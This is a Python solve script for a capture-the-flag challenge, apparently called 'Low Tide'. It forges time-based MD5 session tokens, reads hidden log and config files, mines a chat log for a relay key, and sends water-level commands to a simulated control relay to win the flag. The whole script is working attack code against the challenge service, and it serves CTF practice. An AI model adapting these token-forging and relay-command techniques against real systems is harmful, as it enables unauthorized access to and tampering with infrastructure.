#!/usr/bin/env python3
"""
Full solve script for Low Tide, start to finish.

Runs one stage at a time, stops and prints the result of each stage
before moving to the next. Not optimized for speed, built to show
the work at every step.

Usage: python3 full_solve.py <load_balancer_base_url>
Example: python3 full_solve.py https://low-tide-lb.ctf.csaw.io
"""
import sys
import time
import hashlib
import base64
from datetime import datetime, timezone

import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
CHECKIN = BASE + "/station/checkin"
UA = {"User-Agent": "StationSync-Agent/2.1"}


def step(title):
    print("\n" + "=" * 60)
    print(title)
    print("=" * 60)


def checkin(session, data, headers=None):
    h = {**UA, **(headers or {})}
    return session.post(CHECKIN, headers=h, data=data)


def fresh_token(session, identity):
    """Get the current server time, then compute a token from it.
    Called right before every request that needs one, since the
    token is only valid for a few seconds."""
    r = checkin(session, {"action": "checkin", "token": "x"})
    body = r.json()
    if "sync_time" not in body:
        # rate limited or rotated - handle and retry once
        print("    (server returned a cooldown, waiting and retrying)")
        wait = body.get("cooldown", body.get("retry_after", 15))
        time.sleep(wait + 1)
        r = checkin(session, {"action": "checkin", "token": "x"})
        body = r.json()
    epoch = int(datetime.strptime(body["sync_time"], "%Y-%m-%dT%H:%M:%SZ")
                .replace(tzinfo=timezone.utc).timestamp())
    return hashlib.md5(f"{identity}{epoch}".encode()).hexdigest()


# ---------------------------------------------------------------
step("STAGE 1 - forge a token and get accepted by a station")
# ---------------------------------------------------------------
s = requests.Session()
r = checkin(s, {"action": "checkin", "token": "x"})
sid = s.cookies.get("sid")
print("session id:", sid)

token = fresh_token(s, sid)
r = checkin(s, {"action": "checkin", "token": token})
result = r.json()
print("server response:", result)

station_id = result.get("station_id")
if not station_id:
    print("did not get accepted, stopping here")
    sys.exit(1)

print(f"\naccepted, landed on station: {station_id}")


# ---------------------------------------------------------------
step("STAGE 2 - walk the file listing, follow the hidden trail")
# ---------------------------------------------------------------
V1 = f"{CHECKIN}/api/v1/{station_id}"

token = fresh_token(s, station_id)
r = requests.post(V1 + "/", headers=UA, data={"action": "checkin", "token": token}, cookies={"sid": sid})
print("root listing:", r.json())

token = fresh_token(s, station_id)
r = requests.post(V1 + "/station.log", headers=UA, data={"action": "checkin", "token": token}, cookies={"sid": sid})
print("\nstation.log contents:")
print(r.json().get("content"))
print("(look for the line mentioning a hidden .logs path)")

token = fresh_token(s, station_id)
r = requests.post(V1 + "/.logs/err_3005.log", headers=UA, data={"action": "checkin", "token": token}, cookies={"sid": sid})
print("\nhidden file contents:", r.json())

token = fresh_token(s, station_id)
r = requests.post(V1 + "/config/relay-bot.js", headers=UA, data={"action": "checkin", "token": token}, cookies={"sid": sid})
encoded = r.json().get("content", "")
print("\nconfig file, base64 encoded:", encoded)
print("decoded:", base64.b64decode(encoded).decode())

token = fresh_token(s, station_id)
r = requests.post(V1 + "/config/relay_chat.js", headers=UA, data={"action": "checkin", "token": token}, cookies={"sid": sid})
print("\nnext file contents:", r.json().get("content"))

token = fresh_token(s, station_id)
r = requests.post(V1 + "/config/sync.conf", headers=UA, data={"action": "checkin", "token": token}, cookies={"sid": sid})
print("\nchat auth format, found here:", r.json().get("content"))


# ---------------------------------------------------------------
step("STAGE 3 - authenticate to the chat log and search it")
# ---------------------------------------------------------------
def chat_token(sid_for_probe, station_id):
    r = checkin(s, {"action": "checkin", "token": "x"}, headers=None)
    body = r.json()
    if "sync_time" not in body:
        wait = body.get("cooldown", body.get("retry_after", 15))
        time.sleep(wait + 1)
        r = checkin(s, {"action": "checkin", "token": "x"})
        body = r.json()
    dt = datetime.strptime(body["sync_time"], "%Y-%m-%dT%H:%M:%SZ")
    identity = f"{station_id}{dt.strftime('%b').lower()}{dt.strftime('%d')}{dt.strftime('%y')}{dt.strftime('%H')}{dt.strftime('%M')}"
    return hashlib.md5(identity.encode()).hexdigest()


found_ip = None
found_key = None

for start_id in range(1, 61, 5):
    ctoken = chat_token(sid, station_id)
    r = requests.get(f"{CHECKIN}/api/v2/chat?id={start_id}",
                      headers={**UA, "Authorization": f"Bot {ctoken}"},
                      cookies={"sid": sid})
    body = r.json()
    if "messages" not in body:
        print(f"  id={start_id}: no messages, response was {body}")
        continue
    for m in body["messages"]:
        print(f"  [{m['id']}] {m['from']}: {m['text']}")
        if "." in m["text"] and any(c.isdigit() for c in m["text"]) and "relay key" not in m["text"]:
            if "admin box" in m["text"] or "10." in m["text"]:
                found_ip = m["text"]
        if "-" in m["text"] and len(m["text"].split()) < 8:
            pass  # left for manual reading, the key is easy to spot once you see this batch
    time.sleep(1)

print("\nread through the batches above and note the relay key and admin address")
print("they appear together in one exchange partway through")


# ---------------------------------------------------------------
step("STAGE 4 - get onto station 4, the only one with relay access")
# ---------------------------------------------------------------
if station_id != "st-04":
    print(f"currently on {station_id}, need station-4 specifically")
    print("retrying fresh sessions until landing on it, one attempt at a time")
    for attempt in range(1, 13):
        trial = requests.Session()
        r = checkin(trial, {"action": "checkin", "token": "x"})
        trial_sid = trial.cookies.get("sid")
        epoch = int(datetime.strptime(r.json()["sync_time"], "%Y-%m-%dT%H:%M:%SZ")
                    .replace(tzinfo=timezone.utc).timestamp())
        token = hashlib.md5(f"{trial_sid}{epoch}".encode()).hexdigest()
        r = checkin(trial, {"action": "checkin", "token": token})
        landed = r.json().get("station_id")
        print(f"  attempt {attempt}: landed on {landed}")
        if landed == "st-04":
            s = trial
            sid = trial_sid
            station_id = "st-04"
            print("  now on station-4")
            break
        time.sleep(1)

if station_id != "st-04":
    print("did not land on station-4 within the attempt limit, run this stage again")
    sys.exit(1)


# ---------------------------------------------------------------
step("STAGE 5 - send relay commands, adjust the water level one step at a time")
# ---------------------------------------------------------------
RELAY_KEY = input("\nenter the relay key found in the chat log: ").strip()
ADMIN_IP = input("enter the admin address found in the chat log: ").strip()

print("\nstarting level is 70, target is exactly 20")
print("sending commands one at a time, checking the result after each")

while True:
    direction = input("\nraise or lower? (r/l), or 'done' to stop: ").strip().lower()
    if direction == "done":
        break
    amount = input("by how much? ").strip()
    cmd = f"CMD:WATER:{'RAISE' if direction == 'r' else 'LOWER'}:{amount}"

    token = fresh_token(s, station_id)
    r = requests.post(CHECKIN + "/relay",
                       headers={**UA, "X-Relay-Target": ADMIN_IP, "X-Relay-Key": RELAY_KEY},
                       data={"action": "checkin", "token": token, "cmd": cmd},
                       cookies={"sid": sid})
    print("server response:", r.json())

    if "flag" in str(r.json()):
        print("\nflag found in the response above")
        break

    time.sleep(11)  # relay only accepts one command every 10 seconds
